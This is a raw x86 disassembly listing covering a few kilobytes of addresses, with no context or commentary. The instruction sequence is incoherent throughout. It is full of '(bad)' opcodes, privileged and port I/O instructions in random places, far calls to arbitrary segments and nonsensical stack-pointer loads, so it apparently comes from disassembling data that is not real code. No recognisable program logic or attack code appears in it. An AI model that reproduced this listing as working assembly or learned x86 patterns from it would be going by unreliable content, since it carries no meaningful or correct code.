  41f583:	paddd  mm1,QWORD PTR [esi+eax*4-0x2c31ccb2]
  41f58b:	popf   
  41f58c:	mov    ah,0x29
  41f58e:	aaa    
  41f58f:	nop
  41f590:	and    eax,DWORD PTR [edi-0x1b1e5b89]
  41f596:	movd   mm7,esp
  41f599:	push   ebp
  41f59a:	fistp  QWORD PTR [ecx]
  41f59c:	call   0x39a45ac3
  41f5a1:	fldcw  WORD PTR [esi-0x3d]
  41f5a4:	fld    DWORD PTR [ebx-0x552d51cf]
  41f5aa:	push   ecx
  41f5ab:	les    edx,FWORD PTR [eax+0x3795deec]
  41f5b1:	shl    ecx,1
  41f5b3:	mov    ebp,0xe7992b14
  41f5b8:	daa    
  41f5b9:	add    eax,0x45e0f541
  41f5be:	jnp    0x41f5e6
  41f5c0:	adc    DWORD PTR [esp+ecx*2-0x7b],esi
  41f5c4:	lock pushf 
  41f5c6:	cdq    
  41f5c7:	adc    al,0x23
  41f5c9:	mov    BYTE PTR [edi+ebp*4],bl
  41f5cc:	inc    edi
  41f5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5ce:	es push ss
  41f5d0:	repnz ins BYTE PTR es:[edi],dx
  41f5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5d3:	mov    bh,0xd4
  41f5d5:	out    0x23,eax
  41f5d7:	imul   esi,DWORD PTR [esi+0x6d225801],0x9
  41f5de:	inc    esp
  41f5df:	xlat   BYTE PTR ds:[ebx]
  41f5e0:	rdmsr  
  41f5e2:	mov    esp,0x66c60746
  41f5e7:	cmp    al,0x81
  41f5e9:	scas   eax,DWORD PTR es:[edi]
  41f5ea:	adc    esi,edx
  41f5ec:	adc    al,0x9
  41f5ee:	arpl   WORD PTR [ebx-0x2d20af1a],bx
  41f5f4:	pop    eax
  41f5f5:	mov    dh,0xb2
  41f5f7:	pop    ds
  41f5f8:	or     DWORD PTR [ecx],eax
  41f5fa:	icebp  
  41f5fb:	jns    0x41f60e
  41f5fd:	mov    eax,DWORD PTR [edx+eax*2+0x7ed31cc4]
  41f604:	into   
  41f605:	pop    ebp
  41f606:	loopne 0x41f58c
  41f608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f609:	sbb    DWORD PTR [eax+0x26422c89],esi
  41f60f:	pop    es
  41f610:	sub    al,BYTE PTR [ecx-0x30eaba92]
  41f616:	sbb    eax,0xfbc46a0e
  41f61b:	mov    esp,0x8cef4977
  41f620:	push   0xfffffff4
  41f622:	or     dh,BYTE PTR [ebp+0x5562ff9c]
  41f628:	and    ebp,ebx
  41f62a:	pop    eax
  41f62b:	mov    dh,0xf8
  41f62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f62e:	xchg   edi,eax
  41f62f:	rcr    dh,cl
  41f631:	push   es
  41f632:	add    al,0xa7
  41f634:	adc    eax,0xf6b33130
  41f639:	fstp   st(5)
  41f63b:	(bad)  
  41f63c:	cmp    dh,dl
  41f63e:	mov    dl,0xee
  41f640:	fdivrp st(4),st
  41f642:	inc    edx
  41f643:	rcr    BYTE PTR [ecx],1
  41f645:	popa   
  41f646:	jp     0x41f600
  41f648:	dec    ebp
  41f649:	push   ebx
  41f64a:	or     ch,BYTE PTR [edx-0x64e16686]
  41f650:	sbb    BYTE PTR [ecx],0x28
  41f653:	addr16 inc esp
  41f655:	(bad)  
  41f656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f657:	rcr    DWORD PTR [edi+0x5c],0xe8
  41f65b:	cli    
  41f65c:	mov    esp,0x72187ee3
  41f661:	sbb    al,0xdf
  41f663:	inc    eax
  41f664:	sub    DWORD PTR [ecx-0x35831c95],ecx
  41f66a:	or     al,0x0
  41f66c:	push   esp
  41f66d:	inc    edx
  41f66e:	dec    ecx
  41f66f:	ror    DWORD PTR [edi+0x22],cl
  41f672:	add    BYTE PTR [ebx+0x40e6b3],0x4a
  41f679:	(bad)  
  41f67a:	lahf   
  41f67b:	pop    ebp
  41f67c:	imul   esp,esp,0x24c16cc0
  41f682:	or     ecx,ebp
  41f684:	push   edx
  41f685:	cli    
  41f686:	lahf   
  41f687:	lahf   
  41f688:	out    0x9f,al
  41f68a:	je     0x41f6ce
  41f68c:	inc    edi
  41f68d:	pop    edi
  41f68e:	in     al,dx
  41f68f:	or     ah,cl
  41f691:	je     0x41f6cd
  41f693:	push   cs
  41f694:	sbb    ebp,DWORD PTR [ecx+0x568c14a9]
  41f69a:	test   al,0x3c
  41f69c:	sti    
  41f69d:	not    al
  41f69f:	jle    0x41f6d0
  41f6a1:	push   esi
  41f6a2:	jl     0x41f699
  41f6a4:	push   edi
  41f6a5:	sbb    BYTE PTR [edx+0x3b],ah
  41f6a8:	cld    
  41f6a9:	shl    BYTE PTR [edi-0x75],1
  41f6ac:	mov    ecx,0xfeac81a2
  41f6b2:	or     BYTE PTR [ebx],ch
  41f6b4:	icebp  
  41f6b5:	mov    gs,WORD PTR [eax]
  41f6b7:	sbb    eax,0x3852cdb3
  41f6bc:	pushf  
  41f6bd:	sbb    esp,DWORD PTR [edi]
  41f6bf:	and    BYTE PTR [eax+0x63ee2966],bh
  41f6c5:	imul   esi,edx,0x67996881
  41f6cb:	mov    bh,0x51
  41f6cd:	dec    eax
  41f6ce:	or     DWORD PTR [edx+0x2e11a6f2],ecx
  41f6d4:	(bad)  
  41f6d5:	and    DWORD PTR [esi+0x22bd2903],edi
  41f6db:	mov    cl,0xb8
  41f6dd:	mov    esi,0xfbb9dd0f
  41f6e2:	push   esp
  41f6e3:	in     al,0x4f
  41f6e5:	sbb    al,bh
  41f6e7:	adc    bh,ch
  41f6e9:	arpl   bp,si
  41f6eb:	nop
  41f6ec:	sbb    BYTE PTR [edx],bh
  41f6ee:	sub    esp,DWORD PTR [edx+ebp*8+0x29]
  41f6f2:	mov    bh,0xe7
  41f6f4:	pop    ebx
  41f6f5:	mov    ch,0x44
  41f6f7:	pop    eax
  41f6f8:	inc    ecx
  41f6f9:	ds test edx,0x28cb37e
  41f700:	daa    
  41f701:	lods   eax,DWORD PTR ds:[esi]
  41f702:	(bad)  
  41f703:	jle    0x41f6d2
  41f705:	mov    edi,edx
  41f707:	cmp    DWORD PTR [ebx],esi
  41f709:	add    DWORD PTR [eax+0x3e],esi
  41f70c:	mov    edi,0x618bc34c
  41f711:	push   eax
  41f712:	cmp    al,0x8d
  41f714:	fldcw  WORD PTR [ecx-0x7c394f27]
  41f71a:	mov    al,0x32
  41f71c:	mov    eax,ds:0xf12ec844
  41f721:	cmp    al,0x8
  41f723:	pop    ebx
  41f724:	cmc    
  41f725:	jmp    0x85e8be5d
  41f72a:	shl    DWORD PTR [eax+0x52278624],cl
  41f730:	or     DWORD PTR [ebx-0x1e54b51],ebp
  41f736:	stc    
  41f737:	cli    
  41f738:	or     eax,0xaf8403a5
  41f73d:	repz aad 0xf4
  41f740:	shl    edx,1
  41f742:	jnp    0x41f78d
  41f744:	int    0xf9
  41f746:	das    
  41f747:	xlat   BYTE PTR ds:[ebx]
  41f748:	gs push 0x3c645b6d
  41f74e:	call   0x2f90:0x42a22c2c
  41f755:	lahf   
  41f756:	mov    cl,0x8f
  41f758:	cwde   
  41f759:	repz dec eax
  41f75b:	adc    BYTE PTR [ebp+0x20f73814],0x37
  41f762:	pop    edi
  41f763:	cs ins DWORD PTR es:[edi],dx
  41f765:	test   BYTE PTR [ebx-0x30],ah
  41f768:	jns    0x41f7bf
  41f76a:	pop    edi
  41f76b:	dec    eax
  41f76c:	or     BYTE PTR [edi-0x1da318],cl
  41f772:	pop    edi
  41f773:	das    
  41f774:	sbb    al,0x2e
  41f776:	scas   al,BYTE PTR es:[edi]
  41f777:	out    0x8f,eax
  41f779:	in     al,0x31
  41f77b:	std    
  41f77c:	cmp    eax,DWORD PTR [esi+ecx*8-0x78b2115f]
  41f783:	jmp    0x41f710
  41f785:	add    eax,0xfd3a3dd3
  41f78a:	call   0x7d4be29e
  41f78f:	and    ecx,esi
  41f791:	pop    esp
  41f792:	sbb    BYTE PTR [edx+0x369e17c0],dl
  41f798:	and    bh,BYTE PTR [esi]
  41f79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f79b:	adc    BYTE PTR [edx-0x7d423fe2],bl
  41f7a1:	dec    edx
  41f7a2:	cwde   
  41f7a3:	inc    ebx
  41f7a4:	pop    edx
  41f7a5:	push   esp
  41f7a6:	js     0x41f7c9
  41f7a8:	lods   eax,DWORD PTR ds:[esi]
  41f7a9:	dec    edi
  41f7aa:	or     eax,DWORD PTR [ebx+0x19]
  41f7ad:	repnz mov ah,0xa
  41f7b0:	(bad)  
  41f7b1:	in     eax,dx
  41f7b2:	into   
  41f7b3:	data16 or BYTE PTR [ecx+0x3512d2cc],0xb2
  41f7bb:	cwde   
  41f7bc:	shl    dh,0xc0
  41f7bf:	push   cs
  41f7c0:	in     eax,0xbb
  41f7c2:	aam    0x25
  41f7c4:	popa   
  41f7c5:	div    BYTE PTR [edx+0x23]
  41f7c8:	and    eax,0x667ed1c5
  41f7cd:	inc    esi
  41f7ce:	das    
  41f7cf:	loopne 0x41f846
  41f7d1:	int3   
  41f7d2:	push   ds
  41f7d3:	je     0x41f789
  41f7d5:	(bad)  
  41f7d6:	imul   eax,DWORD PTR [edi+ebp*1+0x1],0x877f10ec
  41f7de:	mov    ah,0x18
  41f7e0:	iret   
  41f7e1:	adc    BYTE PTR cs:[ebx-0x35ce32da],0x5e
  41f7e9:	pushf  
  41f7ea:	or     BYTE PTR [edx+0xb358b57],cl
  41f7f0:	lea    edi,[eax]
  41f7f2:	aad    0x21
  41f7f4:	out    dx,eax
  41f7f5:	std    
  41f7f6:	imul   ecx,DWORD PTR [edi],0x2c066e42
  41f7fc:	push   eax
  41f7fd:	or     al,0x51
  41f7ff:	mov    al,0x2
  41f801:	dec    eax
  41f802:	add    bl,BYTE PTR [esi-0x1b]
  41f805:	jmp    0x18d4:0xaf51cc05
  41f80c:	mov    ah,0x56
  41f80e:	sbb    dl,BYTE PTR [edi]
  41f810:	mov    al,ds:0xd304f6fa
  41f815:	imul   edi,DWORD PTR [esi],0x34fc2c20
  41f81b:	imul   DWORD PTR [ebp-0x40f7b622]
  41f821:	sub    edi,DWORD PTR [ebx+0x5fd98d6]
  41f827:	sbb    eax,0x8c6ae788
  41f82c:	jecxz  0x41f817
  41f82e:	xchg   ebx,eax
  41f82f:	lods   al,BYTE PTR ds:[esi]
  41f830:	es test dh,dh
  41f833:	repnz add dh,dh
  41f836:	push   es
  41f837:	fimul  DWORD PTR [esi+edi*1]
  41f83a:	repz mov cl,0x97
  41f83d:	lock mov BYTE PTR [esi-0x152035ae],0x2c
  41f845:	xor    al,0x4d
  41f847:	inc    esi
  41f848:	into   
  41f849:	or     BYTE PTR ds:0xb2bd3e56,dh
  41f84f:	(bad)  
  41f850:	cmp    DWORD PTR [edi-0x343f6efa],ebp
  41f856:	aam    0x28
  41f858:	ja     0x41f860
  41f85a:	test   al,0x53
  41f85c:	mov    edi,0x44c3b88c
  41f861:	lods   al,BYTE PTR ds:[esi]
  41f862:	mov    bh,dh
  41f864:	cmp    DWORD PTR [edx],edx
  41f866:	mov    dl,0x4a
  41f868:	pop    ecx
  41f869:	adc    ebx,edx
  41f86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f86c:	clc    
  41f86d:	inc    ecx
  41f86e:	push   0x4f
  41f870:	rol    ch,1
  41f872:	sti    
  41f873:	int    0x2f
  41f875:	je     0x41f8a3
  41f877:	fnstsw WORD PTR ds:0xa1179047
  41f87d:	jp     0x41f8ee
  41f87f:	xor    al,0xaa
  41f881:	jg     0x41f83c
  41f883:	mov    bh,0xa4
  41f885:	fsubr  st(0),st
  41f887:	clc    
  41f888:	repnz sbb dl,BYTE PTR [esi+0x40]
  41f88c:	jmp    0x41f845
  41f88e:	jl     0x41f856
  41f890:	or     ah,al
  41f892:	out    dx,eax
  41f893:	fcomp  st(4)
  41f895:	outs   dx,BYTE PTR ds:[esi]
  41f896:	mov    dl,0x5d
  41f898:	sbb    eax,0x569da45b
  41f89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f89e:	js     0x41f83b
  41f8a0:	mul    DWORD PTR [edi-0x31]
  41f8a3:	sbb    bh,BYTE PTR [ebp+0x2634d41]
  41f8a9:	push   esi
  41f8aa:	inc    esp
  41f8ab:	xchg   ebp,eax
  41f8ac:	push   ecx
  41f8ad:	pop    edi
  41f8ae:	(bad)  
  41f8af:	push   ds
  41f8b0:	repnz gs pop eax
  41f8b3:	inc    eax
  41f8b4:	adc    edx,DWORD PTR ds:0xaf573c2
  41f8ba:	pop    ss
  41f8bb:	xor    ebp,DWORD PTR [esi-0x775a505c]
  41f8c1:	into   
  41f8c2:	xchg   ebp,eax
  41f8c3:	pop    eax
  41f8c4:	in     eax,0xaf
  41f8c6:	sbb    ecx,DWORD PTR [esi]
  41f8c8:	cdq    
  41f8c9:	fnstsw WORD PTR [edi+0x2f]
  41f8cc:	xchg   edi,eax
  41f8cd:	inc    eax
  41f8ce:	inc    ecx
  41f8cf:	cmp    al,0x30
  41f8d1:	pop    ebx
  41f8d2:	aas    
  41f8d3:	pushf  
  41f8d4:	mov    edx,0x4625674e
  41f8d9:	jmp    0x36f46b2d
  41f8de:	inc    ecx
  41f8df:	mov    al,ds:0xa6d55b91
  41f8e4:	loop   0x41f8c4
  41f8e6:	xor    eax,0xb15e1d69
  41f8eb:	push   ss
  41f8ec:	and    ebx,eax
  41f8ee:	sub    eax,0xd13411f8
  41f8f3:	cmp    ecx,0xffffffc9
  41f8f6:	sub    BYTE PTR [ecx-0x7f4b8d68],al
  41f8fc:	(bad)  
  41f8fd:	data16 (bad) 
  41f8ff:	daa    
  41f900:	adc    BYTE PTR [esp+eax*2-0x50fb4b34],al
  41f907:	test   al,0x38
  41f909:	int3   
  41f90a:	jmp    0xfbee8d43
  41f90f:	lea    edi,[edx+0x40]
  41f912:	ss dec edi
  41f914:	pop    ss
  41f915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f916:	and    eax,0xcc70dbc1
  41f91b:	push   cs
  41f91c:	lock fld QWORD PTR [esi+0x7b]
  41f920:	fbstp  TBYTE PTR [esp+ebx*8-0x77]
  41f924:	in     al,dx
  41f925:	jp     0x41f8fb
  41f927:	dec    edi
  41f928:	mov    ah,0xdd
  41f92a:	adc    DWORD PTR [ebp+0x9092b76],esp
  41f930:	(bad)  
  41f931:	ins    BYTE PTR es:[edi],dx
  41f932:	xor    BYTE PTR [eax-0x3ab49fa8],ah
  41f938:	mov    WORD PTR [ecx+0x5ea909b1],?
  41f93e:	scas   eax,DWORD PTR es:[edi]
  41f93f:	(bad)  [esi+edi*4-0x41]
  41f943:	adc    eax,0xd6a212f7
  41f948:	mov    BYTE PTR [ebx-0x36e75c2a],dh
  41f94e:	mov    BYTE PTR [eax+ebx*8+0x9],ch
  41f952:	bound  eax,QWORD PTR [esi]
  41f954:	jns    0x41f91c
  41f956:	jne    0x41f950
  41f958:	into   
  41f959:	mov    DWORD PTR [edx-0x5],eax
  41f95c:	lea    esp,[ebx]
  41f95e:	inc    ecx
  41f95f:	lods   eax,DWORD PTR ds:[esi]
  41f960:	test   BYTE PTR [ebp-0xa],dh
  41f963:	inc    ebx
  41f964:	jge    0x41f952
  41f966:	jbe    0x41f94a
  41f968:	and    esp,DWORD PTR [eax+esi*1-0x7eef8bd6]
  41f96f:	icebp  
  41f970:	sub    al,bl
  41f972:	je     0x41f91f
  41f974:	add    BYTE PTR [eax],dh
  41f976:	scas   al,BYTE PTR es:[edi]
  41f977:	shl    dl,0x34
  41f97a:	lds    edi,FWORD PTR [ebx]
  41f97c:	mov    eax,ds:0x8d9abfc0
  41f981:	in     al,0x53
  41f983:	cmp    DWORD PTR [esi+ebp*1],ecx
  41f986:	pop    ebx
  41f987:	sahf   
  41f988:	dec    edx
  41f989:	shl    BYTE PTR ds:0x3c41b141,0x71
  41f990:	pop    ss
  41f991:	(bad)  
  41f992:	jns    0x41f98d
  41f994:	sub    BYTE PTR [ebx-0x3c],al
  41f997:	jne    0x41f9d8
  41f999:	mov    ebp,0x54c0b707
  41f99e:	aaa    
  41f99f:	inc    ebp
  41f9a0:	mov    ebx,0x5e33cb6
  41f9a5:	and    esi,esp
  41f9a7:	shl    DWORD PTR [edx],1
  41f9a9:	dec    edi
  41f9aa:	sti    
  41f9ab:	push   eax
  41f9ac:	data16 mov al,ds:0x27a6268a
  41f9b2:	scas   al,BYTE PTR es:[edi]
  41f9b3:	mov    al,ds:0xe58a4ca0
  41f9b8:	out    0xb4,eax
  41f9ba:	inc    esi
  41f9bb:	out    0x34,al
  41f9bd:	cmp    eax,0xdb118d2b
  41f9c2:	adc    esp,DWORD PTR [esi]
  41f9c4:	dec    edi
  41f9c5:	into   
  41f9c6:	gs in  eax,dx
  41f9c8:	jge    0x41f9d8
  41f9ca:	ret    0x7d18
  41f9cd:	or     eax,0xc73409ad
  41f9d2:	repz shl DWORD PTR [eax],cl
  41f9d5:	out    0x44,al
  41f9d7:	jns    0x41f96d
  41f9d9:	cmp    BYTE PTR [esi-0x1f642fa7],bh
  41f9df:	push   0x3337df69
  41f9e4:	xor    DWORD PTR [ecx+0x2638cbf2],edx
  41f9ea:	mov    esi,DWORD PTR gs:[edx+0xa986841]
  41f9f1:	(bad)  
  41f9f2:	jle    0x41fa46
  41f9f4:	and    esp,edi
  41f9f6:	xchg   ebx,eax
  41f9f7:	fwait
  41f9f8:	pop    ss
  41f9f9:	(bad)  
  41f9fa:	mov    bh,BYTE PTR [edx+0x2737a357]
  41fa00:	ja     0x41f9ce
  41fa02:	sti    
  41fa03:	jle    0x41f9fd
  41fa05:	sbb    bh,dl
  41fa07:	int    0x4c
  41fa09:	lods   al,BYTE PTR ds:[esi]
  41fa0a:	add    ch,BYTE PTR [ecx-0x1a]
  41fa0d:	js     0x41fa07
  41fa0f:	shr    eax,cl
  41fa11:	ins    DWORD PTR es:[edi],dx
  41fa12:	adc    esi,eax
  41fa14:	pop    esp
  41fa15:	mov    al,0x72
  41fa17:	clc    
  41fa18:	push   ss
  41fa19:	sub    eax,0xe158e521
  41fa1e:	jb     0x41f9b5
  41fa20:	gs aaa 
  41fa22:	lea    esp,es:[esi-0x1f]
  41fa26:	stc    
  41fa27:	scas   al,BYTE PTR es:[edi]
  41fa28:	cmp    ecx,DWORD PTR [ebp+0xbaa5eae]
  41fa2e:	cwde   
  41fa2f:	push   edi
  41fa30:	mov    WORD PTR [ebx+0x69],gs
  41fa33:	ins    BYTE PTR es:[edi],dx
  41fa34:	call   DWORD PTR [edi-0x40]
  41fa37:	jo     0x41fa29
  41fa39:	leave  
  41fa3a:	nop
  41fa3b:	popf   
  41fa3c:	bound  eax,QWORD PTR [eax+0x6]
  41fa3f:	imul   DWORD PTR [ebx+0x2b83ed98]
  41fa45:	stos   DWORD PTR es:[edi],eax
  41fa46:	dec    BYTE PTR [edx+0x21f44d3a]
  41fa4c:	xchg   ebp,eax
  41fa4d:	and    dl,BYTE PTR [eax+0x23]
  41fa50:	xchg   BYTE PTR fs:[ecx-0x1de4802b],ch
  41fa57:	mov    bh,dh
  41fa59:	fisttp WORD PTR ds:0xb374d4e1
  41fa5f:	cli    
  41fa60:	mov    esi,0x2f2aa71e
  41fa65:	xor    DWORD PTR [edi+0x7d],ebx
  41fa68:	mov    ebp,ecx
  41fa6a:	sub    BYTE PTR [esi-0x4c4d15ea],dh
  41fa70:	out    0x7c,al
  41fa72:	fisub  WORD PTR [eax-0x759d91d8]
  41fa78:	test   BYTE PTR [edx+0x7f],al
  41fa7b:	mov    eax,ds:0x516687d8
  41fa80:	push   esp
  41fa81:	xchg   ebx,eax
  41fa82:	sar    DWORD PTR [eax+0x1],cl
  41fa85:	mov    BYTE PTR [edx],0x7a
  41fa88:	scas   eax,DWORD PTR es:[edi]
  41fa89:	xchg   esp,eax
  41fa8a:	pop    ecx
  41fa8b:	in     eax,dx
  41fa8c:	xor    eax,0x4f83c79d
  41fa91:	sub    esp,DWORD PTR [ecx]
  41fa93:	push   ebx
  41fa94:	lahf   
  41fa95:	and    bh,BYTE PTR [esi-0x2d1db71b]
  41fa9b:	sub    dh,al
  41fa9d:	add    al,BYTE PTR [ebp+0x7bf9a906]
  41faa3:	nop
  41faa4:	and    esi,DWORD PTR [eax]
  41faa6:	jecxz  0x41fa75
  41faa8:	mov    DWORD PTR [ecx-0x66],edx
  41faab:	cli    
  41faac:	jg     0x41faa6
  41faae:	add    eax,0x2f1834df
  41fab3:	mov    WORD PTR [edi-0x308233f0],cs
  41fab9:	into   
  41faba:	lods   al,BYTE PTR ds:[esi]
  41fabb:	stc    
  41fabc:	push   esi
  41fabd:	aam    0x85
  41fabf:	cli    
  41fac0:	in     eax,0xd3
  41fac2:	lds    ebp,FWORD PTR [ebx+0x23]
  41fac5:	add    DWORD PTR [ecx],ebp
  41fac7:	retf   
  41fac8:	or     al,0x75
  41faca:	bound  edi,QWORD PTR [ebx+0x2a]
  41facd:	push   es
  41face:	push   ecx
  41facf:	or     BYTE PTR [ebp+0x8e34083],bl
  41fad5:	neg    BYTE PTR [ecx-0x4e]
  41fad8:	popa   
  41fad9:	aad    0x7e
  41fadb:	repz mov cl,0x9b
  41fade:	xchg   esi,eax
  41fadf:	(bad)  [esi+0x7d]
  41fae2:	mov    ds:0xe868ff49,al
  41fae7:	imul   edi,DWORD PTR [ebp+0x52f13e57],0x2779ac89
  41faf1:	push   cs
  41faf2:	mov    ebx,DWORD PTR [ebx+0x6]
  41faf5:	mov    ds:0xb6ad1940,al
  41fafa:	dec    ecx
  41fafb:	out    dx,eax
  41fafc:	sub    DWORD PTR [ebp+0x4295feb7],ebx
  41fb02:	pop    ecx
  41fb03:	jbe    0x41fb05
  41fb05:	mov    ch,0x92
  41fb07:	push   ss
  41fb08:	xchg   esi,eax
  41fb09:	fdivr  st(5),st
  41fb0b:	call   0xcf12:0x90741556
  41fb12:	push   edx
  41fb13:	inc    esp
  41fb14:	pop    ecx
  41fb15:	jp     0x41fae5
  41fb17:	jecxz  0x41fafb
  41fb19:	test   DWORD PTR [edi],0x1da08df9
  41fb1f:	fld    TBYTE PTR [ebp-0x39]
  41fb22:	xchg   ebx,eax
  41fb23:	popf   
  41fb24:	mov    ebx,0x87de9162
  41fb29:	add    dl,BYTE PTR [ebx]
  41fb2b:	cmp    eax,0xbcc8acda
  41fb30:	call   0x46a0:0x8255a68
  41fb37:	jbe    0x41fb9c
  41fb39:	mov    eax,ds:0x9d07cfbf
  41fb3e:	pop    edx
  41fb3f:	jb     0x41fafb
  41fb41:	inc    ecx
  41fb42:	and    edi,edx
  41fb44:	dec    ecx
  41fb45:	jnp    0x41fafe
  41fb47:	stos   BYTE PTR es:[edi],al
  41fb48:	xor    ah,BYTE PTR [edi-0x5a]
  41fb4b:	xchg   edx,eax
  41fb4c:	dec    esi
  41fb4d:	outs   dx,DWORD PTR ds:[esi]
  41fb4e:	jb     0x41fbcd
  41fb50:	jp     0x41fbbf
  41fb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb53:	in     eax,dx
  41fb54:	sub    al,0x99
  41fb56:	ret    
  41fb57:	mov    ecx,0x2a5c3e51
  41fb5c:	pop    esp
  41fb5d:	mov    ebx,0xa455e04b
  41fb62:	(bad)  
  41fb63:	push   eax
  41fb64:	mov    ds:0x3691512e,al
  41fb69:	sti    
  41fb6a:	je     0x41fb82
  41fb6c:	cmp    edx,DWORD PTR [esi-0x254af9c4]
  41fb72:	sbb    al,0xeb
  41fb74:	cli    
  41fb75:	mov    edi,0x675f1d6f
  41fb7a:	mov    ah,BYTE PTR [ebp+eax*1+0x77355a9c]
  41fb81:	dec    esp
  41fb82:	xlat   BYTE PTR ds:[ebx]
  41fb83:	dec    ebx
  41fb84:	inc    ebp
  41fb85:	mov    ecx,0x2211cdf9
  41fb8a:	and    al,0xd9
  41fb8c:	fcmove st,st(2)
  41fb8e:	lods   al,BYTE PTR ds:[esi]
  41fb8f:	scas   al,BYTE PTR es:[edi]
  41fb90:	sbb    ebp,DWORD PTR [eax-0x7e]
  41fb93:	mov    cl,0xa2
  41fb95:	js     0x41fb61
  41fb97:	xor    cl,BYTE PTR [esi-0x55]
  41fb9a:	sbb    al,0x20
  41fb9c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fb9e:	and    DWORD PTR [edi+0x3d],0xffffffd1
  41fba2:	mov    ebp,0xe50e67ff
  41fba7:	nop
  41fba8:	add    bl,cl
  41fbaa:	iret   
  41fbab:	(bad)  
  41fbac:	cmp    al,0x48
  41fbae:	lods   eax,DWORD PTR ds:[esi]
  41fbaf:	ret    
  41fbb0:	(bad)  
  41fbb1:	xor    al,BYTE PTR [ebx+0x75]
  41fbb4:	xor    al,0xdf
  41fbb6:	enter  0xff97,0xc1
  41fbba:	sbb    eax,0x9adf6c7e
  41fbbf:	dec    eax
  41fbc0:	scas   al,BYTE PTR es:[edi]
  41fbc1:	cli    
  41fbc2:	dec    edx
  41fbc3:	imul   esi,esi,0xffffffa6
  41fbc6:	cmp    al,0x43
  41fbc8:	nop
  41fbc9:	hlt    
  41fbca:	inc    ebp
  41fbcb:	and    bl,dh
  41fbcd:	mov    bl,0x88
  41fbcf:	cmp    BYTE PTR [ebp+0x57],bh
  41fbd2:	test   DWORD PTR [edx-0x551b86a6],ecx
  41fbd8:	cli    
  41fbd9:	call   0xdf64:0xb02cb495
  41fbe0:	loop   0x41fc26
  41fbe2:	pop    edi
  41fbe3:	cli    
  41fbe4:	retf   
  41fbe5:	xor    BYTE PTR [edx],dl
  41fbe7:	shl    BYTE PTR [esi+0x59],0x54
  41fbeb:	mov    al,ds:0x7f294b97
  41fbf0:	shl    DWORD PTR [ecx-0x6e],1
  41fbf3:	jo     0x41fc71
  41fbf5:	jo     0x41fc20
  41fbf7:	mov    ebp,0x94883af7
  41fbfc:	loope  0x41fc76
  41fbfe:	sti    
  41fbff:	adc    DWORD PTR [eax+eax*8+0x6f],0x44e18092
  41fc07:	xchg   BYTE PTR [edi-0x4da16028],ah
  41fc0d:	test   al,0x1c
  41fc0f:	dec    edi
  41fc10:	int    0x5b
  41fc12:	fidivr DWORD PTR [ebp+eiz*8-0x41]
  41fc16:	cmp    bh,ah
  41fc18:	pop    ds
  41fc19:	mov    ecx,0x2b460af9
  41fc1e:	inc    ecx
  41fc1f:	jp     0x41fbb9
  41fc21:	sub    bh,BYTE PTR [edx+ecx*2+0x13]
  41fc25:	sub    al,0x5a
  41fc27:	inc    ecx
  41fc28:	loope  0x41fc5f
  41fc2a:	ja     0x41fc84
  41fc2c:	mov    ch,0xd3
  41fc2e:	jecxz  0x41fc11
  41fc30:	or     DWORD PTR [bx+di-0x75],0xffffffab
  41fc35:	mov    eax,ds:0xbe97443b
  41fc3a:	cmp    esi,edi
  41fc3c:	cmp    al,0x49
  41fc3e:	clc    
  41fc3f:	jg     0x41fc2c
  41fc41:	mov    edi,0x717d094f
  41fc46:	int3   
  41fc47:	inc    eax
  41fc48:	xchg   ecx,eax
  41fc49:	sub    ebp,DWORD PTR [edi+0x40]
  41fc4c:	imul   edi,edi,0xffffff91
  41fc4f:	fwait
  41fc50:	ror    BYTE PTR [edx-0x26242786],0x1a
  41fc57:	lock jmp 0x41fcc5
  41fc5a:	stos   DWORD PTR es:[edi],eax
  41fc5b:	dec    ebx
  41fc5c:	fwait
  41fc5d:	enter  0x5ad7,0xe0
  41fc61:	fst    st(5)
  41fc63:	add    ecx,esp
  41fc65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc66:	repz pop ss
  41fc68:	clc    
  41fc69:	shr    DWORD PTR [ebx-0x696ab838],0xf1
  41fc70:	jne    0x41fc57
  41fc72:	test   BYTE PTR ds:0x587b2c2f,cl
  41fc78:	ss scas al,BYTE PTR es:[edi]
  41fc7a:	mov    edi,0x8c3cd9af
  41fc7f:	sbb    DWORD PTR [ecx-0x74b93928],eax
  41fc85:	dec    esp
  41fc86:	leave  
  41fc87:	ret    
  41fc88:	inc    esi
  41fc89:	lods   al,BYTE PTR ds:[esi]
  41fc8a:	out    0x75,eax
  41fc8c:	xchg   esp,eax
  41fc8d:	xchg   ecx,eax
  41fc8e:	iret   
  41fc8f:	inc    edx
  41fc90:	(bad)  
  41fc91:	jge    0x41fcc5
  41fc93:	test   al,0xee
  41fc95:	inc    ecx
  41fc96:	push   0xffdb4f9e
  41fc9b:	pop    eax
  41fc9c:	pop    eax
  41fc9d:	popf   
  41fc9e:	js     0x41fd05
  41fca0:	ror    BYTE PTR [esi],0xe
  41fca3:	fisub  WORD PTR [ecx]
  41fca5:	or     BYTE PTR [esi-0x6735388a],al
  41fcab:	xchg   esp,eax
  41fcac:	add    eax,0x24c9d78f
  41fcb1:	dec    edi
  41fcb2:	mov    ebp,ecx
  41fcb4:	cs in  al,dx
  41fcb6:	push   ds
  41fcb7:	faddp  st(5),st
  41fcb9:	call   0x4bec:0x2523563f
  41fcc0:	cdq    
  41fcc1:	stc    
  41fcc2:	into   
  41fcc3:	dec    esi
  41fcc4:	shl    DWORD PTR [ecx],cl
  41fcc6:	pop    es
  41fcc7:	lahf   
  41fcc8:	mov    ebp,0x60169080
  41fccd:	jo     0x41fd05
  41fccf:	jl     0x6aa83e18
  41fcd5:	or     bl,BYTE PTR [edx-0x26]
  41fcd8:	in     al,dx
  41fcd9:	pop    edi
  41fcda:	push   0x1c
  41fcdc:	pop    ebx
  41fcdd:	push   ebx
  41fcde:	(bad)  
  41fcdf:	cld    
  41fce0:	sub    bh,BYTE PTR [ebp+0x1f]
  41fce3:	push   0xd8f350c1
